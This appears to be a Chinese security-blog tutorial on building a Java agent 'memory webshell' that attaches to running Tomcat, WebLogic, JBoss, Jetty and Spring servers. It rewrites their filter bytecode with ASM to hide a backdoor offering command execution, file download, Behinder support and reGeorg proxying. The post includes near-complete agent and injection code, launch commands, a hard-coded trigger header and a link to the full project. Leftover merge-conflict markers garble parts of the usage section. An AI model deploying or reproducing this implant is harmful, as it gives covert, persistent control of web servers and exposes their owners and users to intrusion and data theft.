
工程化编写Agent-filter内存马（含所有工程代码，仅供学习）

- - -

# 工程化编写Agent-filter内存马

## 需要实现的功能

```plain
1.实现简单的命令执行功能
2.实现文件读取和下载功能
3.实现冰蝎功能
4.实现reGeorg 和 reGeorg2 的网络正向proxy功能
```

## filter工作原理

这里首先要解释一下filter的执行顺序，百度了一张图  
[![](assets/1705483297-ac26b381280a4dda1a8db65544e4f141.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240117154035-b32faf62-b50b-1.png)

可以很清晰的看到，当客户端发起请求后，首先是从底层调用内核容器的filter，然后再到web应用filter，最后到自定义的filter以及资源的请求，每一个filter都会有一个doFilter方法，然而每个doFilter方法中都会有一个FilterChain.doFilter，这样就会形成一个递归调用，我们拿shiro举例子,debug后的调用堆栈如下：  
[![](assets/1705483297-23ad6d5f2529b50aa4105e5a1626034b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240117154107-c6c79486-b50b-1.png)

这时候要对vm内存中的doFilterInternal进行篡改，这里可以选择两种方式，一种是通过org.javassist动态更改，另外一种是通过更原始的org.ow2.asm动态更改，之所以选择后者的原因是编译后的jar包很小，经测试只有10k；为了实现这个目标，对比一下两段代码，以shiro举例子(org.apache.shiro.web.servlet.AbstractShiroFilter)。  
篡改前：  
[![](assets/1705483297-dfeeceec3e350ec34cebbea9c1ca2c63.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240117154212-ed658e18-b50b-1.png)  
篡改后：  
[![](assets/1705483297-ee53584fce937771c850fed84e9e639c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240117154235-faf0348e-b50b-1.png)

这里要注意一些比较踩坑的问题，就是有些中间件是会在agent运行的时候自行加入依赖包，有些是不用的，经过分析统计jetty，spring,tomcat,weblogic不需要通过反射来加载运行的agent，jboss和shiro是需要通过反射来加载运营的agent；再举一个spring的例子(org.springframework.web.filter.DelegatingFilterProxy)  
篡改前：  
[![](assets/1705483297-6cb9247acc0af2545fe56b72c6dab87b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240117154322-17336f76-b50c-1.png)  
篡改后：  
[![](assets/1705483297-3189f78ab9fc9e023c07ec44180e79fe.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240117154340-21ee3a40-b50c-1.png)

很明显对比之下，spring的写法相对来说简单多了，原因是什么？，答案：就是有些上下文是不加载本地依赖的

## agent注入的原理

首先了解一段代码，如下：

```plain
public class SpringAgent {
   public static void premain(String args, Instrumentation inst) {
   }
   public static void agentmain(String agentArgs, Instrumentation inst) {
   }
   public static void attach(String ctype) throws Exception {
   }
}
```

agentmain 和 premain 师出同门，我们知道，premain 只能在类加载之前修改字节码，类加载之后无能为力，只能通过重新创建ClassLoader 这种方式重新加载。而 agentmain 就是为了弥补这种缺点而诞生的。简而言之，agentmain 可以在类加载之后再次加载一个类，也就是重定义，你就可以通过在重定义的时候进行修改类了，甚至不需要创建新的类加载器，JVM 已经在内部对类进行了重定义。

这里面构造一个attach的函数，对jvm进行检索，找到适配的vm加载agent，拿spring举例子，因为sprig可能涉及的容器比较多，这里面只分析一下几个，weblogic，jetty，tomcat，jboss，springboot，实现代码如下：

```plain
public static void attach(String ctype) throws Exception {
    VirtualMachine vm = null;
    List < VirtualMachineDescriptor > vmList = null;
    String currentPath = SpringAgent.class.getProtectionDomain().getCodeSource().getLocation().getPath();
    String agentFile = currentPath;
    agentFile = new File(agentFile).getCanonicalPath();
    String agentArgs = currentPath;
    List < VirtualMachine > vlist = new ArrayList < VirtualMachine > ();
    try {
        vmList = VirtualMachine.list();
        for (VirtualMachineDescriptor vmd: vmList) {
            if ("weblogic".equals(ctype)) {
                if (vmd.displayName().toLowerCase().indexOf("weblogic.server") >= 0) {
                    vm = VirtualMachine.attach(vmd);
                    vlist.add(vm);
                }
            }
            if ("jetty".equals(ctype)) {
                if (vmd.displayName().toLowerCase().indexOf("jetty.runner") >= 0) {
                    vm = VirtualMachine.attach(vmd);
                    vlist.add(vm);
                }
            }
            if ("jboss".equals(ctype)) {
                if (vmd.displayName().toLowerCase().indexOf("jboss.as.standalone") >= 0) {
                    vm = VirtualMachine.attach(vmd);
                    vlist.add(vm);
                }
            }
            if ("tomcat".equals(ctype)) {
                if (vmd.displayName().toLowerCase().indexOf("catalina") >= 0 || vmd.displayName().equals("")) {
                    vm = VirtualMachine.attach(vmd);
                    if (vmd.displayName().equals("") && vm.getSystemProperties().containsKey("catalina.home") == false) continue;
                    vlist.add(vm);
                }
            } else if ("springboot".equals(ctype)) {
                vm = VirtualMachine.attach(vmd);
                if (!vm.getSystemProperties().containsKey("sun.boot.library.path")) {
                    continue;
                } else {
                    vlist.add(vm);
                }
            }
        }
        for (int i = 0; i < vlist.size(); i++) {
            try {
                vm = vlist.get(i);
                if (null != vm) {
                    vm.loadAgent(agentFile, agentArgs);
                    vm.detach();
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    } catch (Exception e) {
        e.printStackTrace();
    }
}
```

因为这里的agentmain会在类加载后进行调用，这里实现一个TransformerAsm，通过执行这个asm的字节篡改类达到目的，代码如下：

```plain
public static void agentmain(String agentArgs, Instrumentation inst) {
    try {
        inst.addTransformer(new TransformerAsm(), true);
        Class[] loadedClasses = inst.getAllLoadedClasses();
        for (Class c: loadedClasses) {
            if (c.getName().equals(classname)) {
                try {
                    inst.retransformClasses(c);
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
        }
    } catch (Exception e) {
        e.printStackTrace();
    }
}
```

这样给予一个agent的完整代码实现如下（SpringAgent.java）：

```plain
public class SpringAgent {
    public static String classname="org.springframework.web.filter.DelegatingFilterProxy";//定义要篡改的类
    public static String methodname="doFilter";//定义要篡改的方法
    public static String hookfunc="beforeMethod";//定义篡改的位置，是在老的逻辑调用之前调用篡改的代码
    public static String paramstype="(Ljava/lang/Object;Ljava/lang/Object;)I";
    public static void premain(String args, Instrumentation inst) {
    }
    public static void agentmain(String agentArgs, Instrumentation inst) {
        try {
            inst.addTransformer(new TransformerAsm(), true);
            Class[] loadedClasses = inst.getAllLoadedClasses();
            for (Class c : loadedClasses) {
                if (c.getName().equals(classname)) {
                    try {
                        inst.retransformClasses(c);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    public static void attach(String ctype) throws Exception {
        VirtualMachine vm = null;
        List<VirtualMachineDescriptor> vmList = null;
        String currentPath = SpringAgent.class.getProtectionDomain().getCodeSource().getLocation().getPath();
        String agentFile = currentPath;
        agentFile = new File(agentFile).getCanonicalPath();
        String agentArgs = currentPath;
        List<VirtualMachine> vlist = new ArrayList<VirtualMachine>();
        try {
            vmList = VirtualMachine.list();
            for (VirtualMachineDescriptor vmd : vmList) {
                if("weblogic".equals(ctype)){
                    if (vmd.displayName().toLowerCase().indexOf("weblogic.server") >= 0){
                        vm = VirtualMachine.attach(vmd);
                        vlist.add(vm);
                    }
                }
                if("jetty".equals(ctype)){
                    if (vmd.displayName().toLowerCase().indexOf("jetty.runner") >= 0){
                        vm = VirtualMachine.attach(vmd);
                        vlist.add(vm);
                    }
                }
                if("jboss".equals(ctype)){
                    if (vmd.displayName().toLowerCase().indexOf("jboss.as.standalone") >= 0){
                        vm = VirtualMachine.attach(vmd);
                        vlist.add(vm);
                    }
                }
                if("tomcat".equals(ctype)) {
                    if (vmd.displayName().toLowerCase().indexOf("catalina") >= 0 || vmd.displayName().equals("")) {
                        vm = VirtualMachine.attach(vmd);
                        if (vmd.displayName().equals("") && vm.getSystemProperties().containsKey("catalina.home") == false)
                            continue;
                        vlist.add(vm);
                    }
                }else if("springboot".equals(ctype)){
                    vm = VirtualMachine.attach(vmd);
                    if (!vm.getSystemProperties().containsKey("sun.boot.library.path")) {
                        continue;
                    } else {
                        vlist.add(vm);
                    }
                }
            }
            for (int i = 0; i < vlist.size(); i++) {
                try{
                    vm = vlist.get(i);
                    if (null != vm) {
                        vm.loadAgent(agentFile, agentArgs);
                        vm.detach();
                    }
                }catch (Exception e){e.printStackTrace();}
            }
        } catch (Exception e) {e.printStackTrace();}
    }
    public static void main(String[] args) throws Exception{
        String ctype = args[0];
        String[] cueses = {"tomcat","springboot","jboss","weblogic","jetty"} ;
        if(Arrays.asList(cueses).contains(ctype)) {
            attach(ctype);
        }else{
            System.out.println("params [tomcat,springboot,jboss,weblogic,jetty] ");
        }
    }
}
```

接下来重点就要学习asm的语法了，这个可能比较晦涩难懂，因为要通过java的字节码来操作，网上有大量的资料可以去学习

## TransformerAsm字节篡改的实现

```plain
public class TransformerAsm implements ClassFileTransformer {
    public static class AddCodeVisitor extends ClassVisitor {

        public AddCodeVisitor(int i, ClassVisitor classVisitor) {
            super(i, classVisitor);
        }
        public static class AddCodeMethodVisitor extends MethodVisitor {

            public AddCodeMethodVisitor(int api, MethodVisitor methodVisitor) {
                super(api, methodVisitor);
            }
            @SuppressWarnings("deprecation")
            @Override
            public void visitCode() {
                mv.visitVarInsn(ALOAD, 1);
                mv.visitVarInsn(ALOAD, 2);
                mv.visitMethodInsn(INVOKESTATIC, HookFun.class.getName().replace(".","/"), SpringAgent.hookfunc, SpringAgent.paramstype);
                Label l0 = new Label();
                mv.visitJumpInsn(IFEQ, l0);
                mv.visitInsn(RETURN);
                mv.visitLabel(l0);
                mv.visitFrame(Opcodes.F_SAME, 0, null, 0, null);
                super.visitCode();
            }
        }
        @Override
        public MethodVisitor visitMethod(int access, String name, String descriptor, String signature, String[] exceptions) {
            if(name.equals(SpringAgent.methodname)){
                MethodVisitor mv = cv.visitMethod(access, name, descriptor, signature, exceptions);
                return new AddCodeMethodVisitor(this.api,mv);
            }
            return super.visitMethod(access, name, descriptor, signature, exceptions);
        }
    }

    public byte[] transform(ClassLoader classLoader, String s, Class<?> aClass, ProtectionDomain protectionDomain, byte[] bytes) throws IllegalClassFormatException {

        String fullName = SpringAgent.classname.replace(".","/");
        if (s.equals(fullName)) {
            try {
                ClassReader cr = new ClassReader(classLoader.getResourceAsStream(fullName+".class"));
                ClassWriter cw = new ClassWriter(0);
                AddCodeVisitor cv = new AddCodeVisitor(ASM4,cw);
                cr.accept(cv,ClassReader.SKIP_DEBUG);
                byte[] byteCode = cw.toByteArray();
                return byteCode;
            } catch (Exception ex) {ex.printStackTrace();}
        }
        return null;
    }
}
```

这里的visitCode就是实现上面spring的例子里面的那段篡改逻辑，到这里就已经完整实现了对于spring的一个agnet的编写，因为spring相对来写asm的代码非常简单，但是对于shiro这种通过反射机制来编写的就非常的复杂，代码如下：

```plain
public void visitCode() {
                mv.visitCode();
                mv.visitVarInsn(ALOAD, 1);
                mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Object", "getClass", "()Ljava/lang/Class;");
                mv.visitLdcInsn("getHeader");
                mv.visitInsn(ICONST_1);
                mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
                mv.visitInsn(DUP);
                mv.visitInsn(ICONST_0);
                mv.visitLdcInsn(Type.getType("Ljava/lang/String;"));
                mv.visitInsn(AASTORE);
                mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;");
                mv.visitVarInsn(ALOAD, 1);
                mv.visitInsn(ICONST_1);
                mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
                mv.visitInsn(DUP);
                mv.visitInsn(ICONST_0);
                mv.visitLdcInsn(ShiroAgent.authkey.split(":")[0]);
                mv.visitInsn(AASTORE);
                mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;");
                mv.visitTypeInsn(CHECKCAST, "java/lang/String");
                mv.visitVarInsn(ASTORE, 4);
                mv.visitLdcInsn(ShiroAgent.authkey.split(":")[1]);
                mv.visitVarInsn(ALOAD, 4);
                mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/String", "equals", "(Ljava/lang/Object;)Z");
                Label l0 = new Label();
                mv.visitJumpInsn(IFEQ, l0);
                mv.visitTypeInsn(NEW, "java/io/File");
                mv.visitInsn(DUP);
                try {mv.visitLdcInsn(new File(TransformerAsm.class.getProtectionDomain().getCodeSource().getLocation().getPath()).getCanonicalPath());} catch (IOException e) {};
                mv.visitMethodInsn(INVOKESPECIAL, "java/io/File", "<init>", "(Ljava/lang/String;)V");
                mv.visitMethodInsn(INVOKEVIRTUAL, "java/io/File", "toURI", "()Ljava/net/URI;");
                mv.visitMethodInsn(INVOKEVIRTUAL, "java/net/URI", "toURL", "()Ljava/net/URL;");
                mv.visitVarInsn(ASTORE, 5);
                mv.visitTypeInsn(NEW, "java/net/URLClassLoader");
                mv.visitInsn(DUP);
                mv.visitInsn(ICONST_1);
                mv.visitTypeInsn(ANEWARRAY, "java/net/URL");
                mv.visitInsn(DUP);
                mv.visitInsn(ICONST_0);
                mv.visitVarInsn(ALOAD, 5);
                mv.visitInsn(AASTORE);
                mv.visitMethodInsn(INVOKESPECIAL, "java/net/URLClassLoader", "<init>", "([Ljava/net/URL;)V");
                mv.visitVarInsn(ASTORE, 6);
                mv.visitVarInsn(ALOAD, 6);
                mv.visitLdcInsn("com.jk.HookFun");
                mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/ClassLoader", "loadClass", "(Ljava/lang/String;)Ljava/lang/Class;");
                mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "newInstance", "()Ljava/lang/Object;");
                mv.visitVarInsn(ASTORE, 7);
                mv.visitVarInsn(ALOAD, 7);
                mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Object", "getClass", "()Ljava/lang/Class;");
                mv.visitLdcInsn(ShiroAgent.hookfunc);
                mv.visitInsn(ICONST_2);
                mv.visitTypeInsn(ANEWARRAY, "java/lang/Class");
                mv.visitInsn(DUP);
                mv.visitInsn(ICONST_0);
                mv.visitLdcInsn(Type.getType("Ljava/lang/Object;"));
                mv.visitInsn(AASTORE);
                mv.visitInsn(DUP);
                mv.visitInsn(ICONST_1);
                mv.visitLdcInsn(Type.getType("Ljava/lang/Object;"));
                mv.visitInsn(AASTORE);
                mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/Class", "getMethod", "(Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;");
                mv.visitVarInsn(ALOAD, 7);
                mv.visitInsn(ICONST_2);
                mv.visitTypeInsn(ANEWARRAY, "java/lang/Object");
                mv.visitInsn(DUP);
                mv.visitInsn(ICONST_0);
                mv.visitVarInsn(ALOAD, 1);
                mv.visitInsn(AASTORE);
                mv.visitInsn(DUP);
                mv.visitInsn(ICONST_1);
                mv.visitVarInsn(ALOAD, 2);
                mv.visitInsn(AASTORE);
                mv.visitMethodInsn(INVOKEVIRTUAL, "java/lang/reflect/Method", "invoke", "(Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;");
                mv.visitInsn(POP);
                mv.visitInsn(RETURN);
                mv.visitLabel(l0);
                super.visitCode();
            }
```

这部分还是比较晦涩难懂，建议还是要去研究一下asm的原理

## 实现HookFunc

因为篡改后要调用HookFunc函数，所以隐藏的后门实现都在这里面，代码如下：  
[![](assets/1705483297-8dd65656554d779a1200eb76b4ae5f97.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240117160733-77b13aba-b50f-1.png)  
可以看到这里面全部都是通过反射调用实现的，所以我们为了集中工程化，还得实现自定义的request，header，response等等，如图：  
[![](assets/1705483297-c826dfba3392e10ad540aca13ff16965.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240117160918-b6a1d112-b50f-1.png)  
这里面也包括对冰蝎，以及proxy的改造等等，这里就不贴代码了

## 工程化实现

完整的代码架构如下：  
[![](assets/1705483297-023e2efa31cbe52f85a000df0011a096.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240117161054-ef9d7d68-b50f-1.png)  
MANIFEST.MF编译时候的入口设置，这样设置的好处就是可以根据上下文环境制定特定的agent，减少文件的大小，如果全部都默认的话，这里只需要指定plugins.Agent

```plain
Can-Redefine-Classes: true
    Agent-Class: plugins.tomcat.TomcatAgent
    Premain-Class: plugins.tomcat.TomcatAgent
    Main-Class: plugins.tomcat.TomcatAgent
    Can-Retransform-Classes: true
```

## 使用说明

可以通过编译生成一个memAgent.jar，使用说明如下：

#### 编译注释：

```plain
jboss->plugins.jboss.JbossAgent
  tomcat->plugins.tomcat.TomcatAgent
  jetty->plugins.jetty.JettyAgent
  shiro->plugins.shiro.ShiroAgent
  spring->plugins.spring.SpringAgent
```

#### JBOSS

```plain
windows 验证如下
    "%JAVA_HOME%/bin/java" -cp "%JAVA_HOME%/lib/tools.jar";memAgent.jar plugins.jboss.JbossAgent
    linux  验证如下
    "$JAVA_HOME/bin/java" -cp "$JAVA_HOME/lib/tools.jar":memAgent.jar plugins.jboss.JbossAgent
```

#### TOMCAT

```plain
windows 验证如下
    "%JAVA_HOME%/bin/java" -cp "%JAVA_HOME%/lib/tools.jar";memAgent.jar plugins.tomcat.TomcatAgent
    linux  验证如下
    "$JAVA_HOME/bin/java" -cp "$JAVA_HOME/lib/tools.jar":memAgent.jar plugins.tomcat.TomcatAgent
```

#### JETTY

# <<<<<<< HEAD

> > > > > > > 26ef89ea37f7c1fc69a9a52a05f5ac7c1e26fd4f
> > > > > > > 
> > > > > > > ```plain
> > > > > > > windows 验证如下
> > > > > > >     "%JAVA_HOME%/bin/java" -cp "%JAVA_HOME%/lib/tools.jar";memAgent.jar plugins.jetty.JettyAgent
> > > > > > >     linux  验证如下
> > > > > > >     "$JAVA_HOME/bin/java" -cp "$JAVA_HOME/lib/tools.jar":memAgent.jar plugins.jetty.JettyAgent
> > > > > > > ```

#### SHIRO

```plain
windows 验证如下
    "%JAVA_HOME%/bin/java" -cp "%JAVA_HOME%/lib/tools.jar";memAgent.jar plugins.shiro.ShiroAgent [tomcat|springboot|jboss|jetty]
    linux  验证如下
    "$JAVA_HOME/bin/java" -cp "$JAVA_HOME/lib/tools.jar":memAgent.jar plugins.shiro.ShiroAgent [tomcat|springboot|jboss|jetty]
```

#### SPRING

```plain
windows 验证如下
    "%JAVA_HOME%/bin/java" -cp "%JAVA_HOME%/lib/tools.jar";memAgent.jar plugins.spring.SpingAgent [tomcat|springboot|jboss|jetty]
    linux  验证如下
    "$JAVA_HOME/bin/java" -cp "$JAVA_HOME/lib/tools.jar":memAgent.jar plugins.spring.SpingAgent [tomcat|springboot|jboss|jetty]
```

#### 请求头必须携带

# <<<<<<< HEAD

```plain
Signature: bl4ckH0le
```

> > > > > > > 26ef89ea37f7c1fc69a9a52a05f5ac7c1e26fd4f
> > > > > > > 
> > > > > > > ```plain
> > > > > > > Signature: bl4ckH0le
> > > > > > > ```

## 总结

好久没有编写文章了，可能有些地方比较晦涩难懂，交流可以私信，此工程适配的容器以及javaweb 范围比较大，均在测试环境进行，版本跨度也比较大，实际使用还是要慎重，给予内存字节码篡改的，对于java的vm版本跨度大的要求还是比较高，完整的工程代码附件在文章结尾

![](assets/1705483297-c1a690c3008373b105f447e452f0cfec.gif)memAgent.zip (0.029 MB) [下载附件](https://xzfile.aliyuncs.com/upload/affix/20240117162411-cac03c2c-b511-1.zip)
